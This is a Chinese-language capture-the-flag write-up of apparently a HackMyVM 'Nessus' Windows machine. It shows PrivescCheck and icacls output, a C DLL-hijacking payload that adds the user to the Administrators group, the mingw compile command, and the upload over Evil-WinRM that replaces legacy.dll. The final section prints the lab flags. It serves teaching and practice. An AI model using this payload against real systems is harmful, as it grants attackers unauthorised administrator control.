????????????????????????????????????????????????????????????????
? Check whether the current user has any privileged access     ?
? right on a Process or Thread they do not own.                ?
????????????????????????????????????????????????????????????????
[*] Status: Informational (not vulnerable) - Severity: None - Execution time: 00:00:01.457


????????????????????????????????????????????????????????????????
? CATEGORY ? TA0004 - Privilege Escalation                     ?
? NAME     ? Misc - User Sessions                              ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Get information about the currently logged-on users. Note    ?
? that it might be possible to capture or relay the            ?
? NTLM/Kerberos authentication of these users (RemotePotato0,  ?
? KrbRelay).                                                   ?
????????????????????????????????????????????????????????????????
[*] Status: Informational (nothing found) - Severity: None - Execution time: 00:00:00.043


????????????????????????????????????????????????????????????????
?                 ~~~ PrivescCheck Summary ~~~                 ?
????????????????????????????????????????????????????????????????
 TA0004 - Privilege Escalation
 - Services - Image File Permissions ▒ High
 TA0006 - Credential Access
 - Hardening - Credential Guard ▒ Low
 - Hardening - LSA Protection ▒ Low

WARNING: To get more info, run this script with the option '-Extended'.

```

 发现了一处权限比较高`C:\Program Files\Tenable\Nessus\nessus-service.exe`，AllAccess是权限集合中的**完全控制权限**，覆盖所有其他基础权限（如读取、写入、执行等），允许用户或组对资源进行**无限制操作**，看一下：  

```plain
*Evil-WinRM* PS C:\> cd "C:\Program Files\Tenable\Nessus\"
*Evil-WinRM* PS C:\Program Files\Tenable\Nessus> dir


    Directory: C:\Program Files\Tenable\Nessus


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        10/18/2024  10:35 AM              1 .winperms
-a----          5/9/2024  11:30 PM        2471544 fips.dll
-a----          5/9/2024  11:30 PM        5217912 icudt73.dll
-a----          5/9/2024  11:30 PM        1575032 icuuc73.dll
-a----          5/9/2024  11:30 PM        4988536 legacy.dll
-a----          5/9/2024  11:06 PM         375266 License.rtf
-a----          5/9/2024  11:37 PM       11204728 nasl.exe
-a----          5/9/2024  11:31 PM         264824 ndbg.exe
-a----          5/9/2024  11:06 PM             46 Nessus Web Client.url
-a----          5/9/2024  11:33 PM          38520 nessus-service.exe
-a----          5/9/2024  11:37 PM       11143800 nessuscli.exe
-a----          5/9/2024  11:38 PM       11925624 nessusd.exe

```

发现存在一些`dll`文件，猜测可能存在劫持漏洞，看一下权限：

```plain
*Evil-WinRM* PS C:\Program Files\Tenable\Nessus> icacls "C:\Program Files\Tenable\Nessus\*"
C:\Program Files\Tenable\Nessus\.winperms NT AUTHORITY\SYSTEM:(I)(F)
                                          BUILTIN\Administrators:(I)(F)
                                          BUILTIN\Users:(I)(RX)
                                          NESSUS\nesus:(I)(F)
                                          APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                          APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

C:\Program Files\Tenable\Nessus\fips.dll NT AUTHORITY\SYSTEM:(I)(F)
                                         BUILTIN\Administrators:(I)(F)
                                         BUILTIN\Users:(I)(RX)
                                         NESSUS\nesus:(I)(F)
                                         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

C:\Program Files\Tenable\Nessus\icudt73.dll NT AUTHORITY\SYSTEM:(I)(F)
                                            BUILTIN\Administrators:(I)(F)
                                            BUILTIN\Users:(I)(RX)
                                            NESSUS\nesus:(I)(F)
                                            APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                            APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

C:\Program Files\Tenable\Nessus\icuuc73.dll NT AUTHORITY\SYSTEM:(I)(F)
                                            BUILTIN\Administrators:(I)(F)
                                            BUILTIN\Users:(I)(RX)
                                            NESSUS\nesus:(I)(F)
                                            APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                            APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

C:\Program Files\Tenable\Nessus\legacy.dll NT AUTHORITY\SYSTEM:(I)(F)
                                           BUILTIN\Administrators:(I)(F)
                                           BUILTIN\Users:(I)(RX)
                                           NESSUS\nesus:(I)(F)
                                           APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                           APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

C:\Program Files\Tenable\Nessus\License.rtf NT AUTHORITY\SYSTEM:(I)(F)
                                            BUILTIN\Administrators:(I)(F)
                                            BUILTIN\Users:(I)(RX)
                                            NESSUS\nesus:(I)(F)
                                            APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                            APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

C:\Program Files\Tenable\Nessus\nasl.exe NT AUTHORITY\SYSTEM:(I)(F)
                                         BUILTIN\Administrators:(I)(F)
                                         BUILTIN\Users:(I)(RX)
                                         NESSUS\nesus:(I)(F)
                                         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

C:\Program Files\Tenable\Nessus\ndbg.exe NT AUTHORITY\SYSTEM:(I)(F)
                                         BUILTIN\Administrators:(I)(F)
                                         BUILTIN\Users:(I)(RX)
                                         NESSUS\nesus:(I)(F)
                                         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

C:\Program Files\Tenable\Nessus\Nessus Web Client.url NT AUTHORITY\SYSTEM:(I)(F)
                                                      BUILTIN\Administrators:(I)(F)
                                                      BUILTIN\Users:(I)(RX)
                                                      NESSUS\nesus:(I)(F)
                                                      APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                                      APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

C:\Program Files\Tenable\Nessus\nessus-service.exe NT AUTHORITY\SYSTEM:(I)(F)
                                                   BUILTIN\Administrators:(I)(F)
                                                   BUILTIN\Users:(I)(RX)
                                                   NESSUS\nesus:(I)(F)
                                                   APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                                   APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

C:\Program Files\Tenable\Nessus\nessuscli.exe NT AUTHORITY\SYSTEM:(I)(F)
                                              BUILTIN\Administrators:(I)(F)
                                              BUILTIN\Users:(I)(RX)
                                              NESSUS\nesus:(I)(F)
                                              APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                              APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

C:\Program Files\Tenable\Nessus\nessusd.exe NT AUTHORITY\SYSTEM:(I)(F)
                                            BUILTIN\Administrators:(I)(F)
                                            BUILTIN\Users:(I)(RX)
                                            NESSUS\nesus:(I)(F)
                                            APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                            APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 12 files; Failed processing 0 files

```

| **符号** | **权限说明** | **对应操作** |
| :---: | :---: | :---: |
| `F` | 完全控制 | 读取、写入、执行、删除、修改属性 |
| `M` | 修改 | 写入、删除（需配合`F`<br/>） |
| `RX` | 读取和执行 | 查看内容、运行程序 |
| `R` | 只读 | 查看内容 |
| `W` | 写入 | 修改内容（需目录权限） |
| `D` | 删除 | 删除文件或子目录 |


`**F**`：完全控制（Full Control）： 包含所有权限（读取、写入、执行、删除、修改属性等），可完全控制文件或目录。



## dll劫持
在网上找了一个dll的劫持脚本，尝试进行利用：https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html

也可参考：https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/dll-hijacking/index.html?highlight=windows%20dll#dll-search-order

```plain
/*
DLL hijacking example
author: @cocomelonc
*/

#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call)  {
    case DLL_PROCESS_ATTACH:
      system("cmd.exe /k net localgroup administrators nesus /add");
      break;
    case DLL_PROCESS_DETACH:
      break;
    case DLL_THREAD_ATTACH:
      break;
    case DLL_THREAD_DETACH:
      break;
    }
    return TRUE;
}

```

进行编译再上传

```plain
┌──(kali㉿kali)-[~/temp/Nessus]
└─$ x86_64-w64-mingw32-gcc exp.c -shared -o legacy.dll
```

### `-shared`
这个参数表示：

**生成“共享库”，而不是可执行文件（.exe）**

在 Windows 里：

+ `-shared` ⇒ 生成 `.dll`
+ 不加 `-shared` ⇒ 默认生成 `.exe`

```plain
*Evil-WinRM* PS C:\Users\nesus\Documents> cd "C:\Program Files\Tenable\Nessus"
*Evil-WinRM* PS C:\Program Files\Tenable\Nessus> dir


    Directory: C:\Program Files\Tenable\Nessus


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        10/18/2024  10:35 AM              1 .winperms
-a----          5/9/2024  11:30 PM        2471544 fips.dll
-a----          5/9/2024  11:30 PM        5217912 icudt73.dll
-a----          5/9/2024  11:30 PM        1575032 icuuc73.dll
-a----          5/9/2024  11:30 PM        4988536 legacy.dll
-a----          5/9/2024  11:06 PM         375266 License.rtf
-a----          5/9/2024  11:37 PM       11204728 nasl.exe
-a----          5/9/2024  11:31 PM         264824 ndbg.exe
-a----          5/9/2024  11:06 PM             46 Nessus Web Client.url
-a----          5/9/2024  11:33 PM          38520 nessus-service.exe
-a----          5/9/2024  11:37 PM       11143800 nessuscli.exe
-a----          5/9/2024  11:38 PM       11925624 nessusd.exe


*Evil-WinRM* PS C:\Program Files\Tenable\Nessus> upload legacy.dll legacy.dll
                                        
Info: Uploading /home/kali/Desktop/hmv/legacy.dll to C:\Program Files\Tenable\Nessus\legacy.dll                     
                                        
Data: 115344 bytes of 115344 bytes copied
                                        
Info: Upload successful!

*Evil-WinRM* PS C:\Program Files\Tenable\Nessus> .\nessus-service.exe

```

```plain
*Evil-WinRM* PS C:\users\Administrator> cd "C:\Program Files\Tenable\Nessus"
*Evil-WinRM* PS C:\Program Files\Tenable\Nessus> mv legacy.dll legacy_beifen.dll
*Evil-WinRM* PS C:\Program Files\Tenable\Nessus> upload legacy.dll legacy.dll
                                        
Info: Uploading /home/kali/Desktop/hmv/legacy.dll to C:\Program Files\Tenable\Nessus\legacy.dll                     
                                        
Data: 115344 bytes of 115344 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Program Files\Tenable\Nessus> .\nessus-service.exe
*Evil-WinRM* PS C:\Program Files\Tenable\Nessus> cd c:/users/Administrator
*Evil-WinRM* PS C:\users\Administrator> type root.txt
Cannot find path 'C:\users\Administrator\root.txt' because it does not exist.
At line:1 char:1
+ type root.txt
+ ~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (C:\users\Administrator\root.txt:String) [Get-Content], ItemNotFoundException
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetContentCommand

```

 尝试重启靶机，看一下是否成功修改：  

```plain
┌──(kali㉿kali)-[~/temp/Nessus]
└─$ evil-winrm -i $IP -u nesus -p password
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\nesus\Documents> cd "C:\Program Files\Tenable\Nessus"
*Evil-WinRM* PS C:\Program Files\Tenable\Nessus> dir


    Directory: C:\Program Files\Tenable\Nessus


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        10/18/2024  10:35 AM              1 .winperms
-a----          5/9/2024  11:30 PM        2471544 fips.dll
-a----          5/9/2024  11:30 PM        5217912 icudt73.dll
-a----          5/9/2024  11:30 PM        1575032 icuuc73.dll
-a----          6/9/2025   8:48 AM          86510 legacy.dll
-a----          5/9/2024  11:30 PM        4988536 legacy_beifen.dll
-a----          5/9/2024  11:06 PM         375266 License.rtf
-a----          6/9/2025   8:21 AM         424096 Listdlls.exe
-a----          5/9/2024  11:37 PM       11204728 nasl.exe
-a----          5/9/2024  11:31 PM         264824 ndbg.exe
-a----          5/9/2024  11:06 PM             46 Nessus Web Client.url
-a----          5/9/2024  11:33 PM          38520 nessus-service.exe
-a----          5/9/2024  11:37 PM       11143800 nessuscli.exe
-a----          5/9/2024  11:38 PM       11925624 nessusd.exe


*Evil-WinRM* PS C:\Program Files\Tenable\Nessus> whoami /all

USER INFORMATION
----------------

User Name    SID
============ ============================================
nessus\nesus S-1-5-21-2986980474-46765180-2505414164-1001


GROUP INFORMATION
-----------------

Group Name                                                    Type             SID          Attributes
============================================================= ================ ============ ===============================================================
Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users                               Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                                        Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
NT AUTHORITY\NETWORK                                          Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users                              Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                                Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account                                    Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication                              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level                          Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled

```



```plain
*Evil-WinRM* PS C:\Program Files\Tenable\Nessus> cd c:/users/Administrator
*Evil-WinRM* PS C:\users\Administrator> cd desktop
*Evil-WinRM* PS C:\users\Administrator\desktop> dir


    Directory: C:\users\Administrator\desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        10/18/2024  12:11 PM             70 root.txt

*Evil-WinRM* PS C:\users\nesus\Desktop> type user.txt
72113f41d43e88eb5d67f732668bc3d1

*Evil-WinRM* PS C:\users\Administrator\desktop> type root.txt
b5fc5a4ebfc20cc18220a814e1aee0aa
```

## 关于验证哪些函数可用dll劫持
[DLL Export Viewer](https://www.nirsoft.net/utils/dll_export_viewer.html) 可用查看哪些函数可用，然后用于编写脚本进行劫持。

